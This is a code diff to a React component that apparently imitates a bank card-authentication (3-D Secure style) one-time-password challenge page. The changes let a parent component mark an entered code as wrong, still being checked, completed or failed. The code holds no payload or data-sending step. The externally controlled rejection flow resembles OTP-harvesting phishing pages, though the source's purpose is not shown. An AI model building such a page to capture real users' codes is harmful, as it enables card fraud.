@@ -1,4 +1,4 @@
-import React, { useMemo, useState } from 'react';
+import React, { useEffect, useMemo, useState } from 'react';
 
 function maskPhone(last3) {
   const d = String(last3 || '').replace(/\D/g, '').slice(-3);
@@ -32,13 +32,36 @@ export function AcsOtpChallenge({
 
   const phoneMask = useMemo(() => maskPhone(phoneLast3), [phoneLast3]);
 
-  // Only force processing/failed from parent — never block Method/Verify otherwise
+  // Stay on Verify while checking — only show redirect AFTER correct (completed)
   const view =
     externalState === 'failed'
       ? 'failed'
-      : externalState === 'checking' || submitting
+      : externalState === 'completed'
         ? 'processing'
         : phase;
+
+  useEffect(() => {
+    if (otpRetryNotice) {
+      setSubmitting(false);
+      setPhase('verify');
+      setError('The code you entered is incorrect. Please try again.');
+      setOtp('');
+      setAttempt((a) => a + 1);
+    }
+  }, [otpRetryNotice]);
+
+  useEffect(() => {
+    if (externalState === 'input' || externalState === 'idle') {
+      setSubmitting(false);
+    }
+    if (externalState === 'completed') {
+      setSubmitting(false);
+      setPhase('processing');
+    }
+    if (externalState === 'failed') {
+      setSubmitting(false);
+    }
+  }, [externalState]);
 
   /** Next on Choose Method: ALWAYS go to Verify; fire API in background (never hang UI) */
   const handleMethodNext = () => {
@@ -66,6 +89,7 @@ export function AcsOtpChallenge({
     }
     setError('');
     setSubmitting(true);
+    setPhase('verify');
     Promise.resolve(onSubmitOtp(code))
       .catch(() => {
         setError('The code you entered is incorrect. Please try again.');
@@ -188,6 +212,7 @@ export function AcsOtpChallenge({
             maxLength={6}
             placeholder="------"
             value={otp}
+            disabled={submitting || externalState === 'checking'}
             onChange={(e) => {
               setOtp(e.target.value.replace(/\D/g, '').slice(0, 6));
               setError('');
@@ -196,8 +221,13 @@ export function AcsOtpChallenge({
               if (e.key === 'Enter') e.preventDefault();
             }}
           />
-          <button type="button" className="acs-btn acs-btn-primary" onClick={handleSubmit}>
-            Submit
+          <button
+            type="button"
+            className="acs-btn acs-btn-primary"
+            disabled={submitting || externalState === 'checking'}
+            onClick={handleSubmit}
+          >
+            {submitting || externalState === 'checking' ? 'Checking...' : 'Submit'}
           </button>
           <button
             type="button"
